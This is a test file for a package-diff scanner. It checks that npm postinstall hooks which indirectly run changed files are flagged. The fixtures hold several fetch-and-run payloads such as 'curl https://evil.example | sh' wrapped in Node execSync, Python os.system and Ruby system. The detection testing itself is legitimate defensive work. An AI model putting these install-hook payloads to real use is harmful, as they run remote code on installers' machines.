import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const evil = "require('child_process').execSync('curl https://evil.example | sh')\n";
const py = "import os; os.system('curl evil|sh')\n";
const sh = "curl https://evil.example | sh\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const nj = (body: string): Record<string, string> => ({
  "package.json": pj({ postinstall: "node scripts/install.js" }),
  "scripts/install.js": body,
  "tools/run.js": "1\n",
  "README.md": "a\n",
});

const cases: [string, Record<string, string>, string, string][] = [
  ["G1 python importlib computed", { "package.json": pj({ postinstall: "python3 install.py" }), "install.py": "import importlib\nimportlib.import_module('lib.'+'a')\n", "lib/__init__.py": "\n", "lib/a.py": "x=1\n", "README.md": "a\n" }, "lib/a.py", py],
  ["G2 python __import__ computed", { "package.json": pj({ postinstall: "python3 install.py" }), "install.py": "__import__('hel'+'per')\n", "helper.py": "x=1\n", "README.md": "a\n" }, "helper.py", py],
  ["G3 python subprocess runs tools/", { "package.json": pj({ postinstall: "python3 install.py" }), "install.py": "import subprocess,sys\nsubprocess.run([sys.executable,'tools/'+'run.py'])\n", "tools/run.py": "x=1\n", "README.md": "a\n" }, "tools/run.py", py],
  ["G4 ruby require_relative computed", { "package.json": pj({ postinstall: "ruby install.rb" }), "install.rb": "require_relative 'lib/' + 'a'\n", "lib/a.rb": "1\n", "README.md": "a\n" }, "lib/a.rb", "system('curl evil|sh')\n"],
  ["G5 sh runs computed tools/ script", { "package.json": pj({ postinstall: "sh install.sh" }), "install.sh": "N=run\nsh \"tools/$N.sh\"\n", "tools/run.sh": "true\n", "README.md": "a\n" }, "tools/run.sh", sh],
  ["G6 execSync computed node file", nj("const n='run';require('child_process').execSync('node '+__dirname+'/../tools/'+n+'.js')\n"), "tools/run.js", evil],
  ["G7 spawn computed node file", nj("const n='run';require('child_process').spawn(process.execPath,[__dirname+'/../tools/'+n+'.js'])\n"), "tools/run.js", evil],
  ["G8 vm.Script via alias", nj("const fs=require('fs'),vm=require('vm');const n='run';const s=new vm.Script(fs.readFileSync(__dirname+'/../tools/'+n+'.js','utf8'));s.runInThisContext()\n"), "tools/run.js", evil],
  ["G9 Worker computed outside dir", nj("const {Worker}=require('worker_threads');const n='run';new Worker(__dirname+'/../tools/'+n+'.js')\n"), "tools/run.js", evil],
];

for (const [name, base, file, bad] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
  });
}
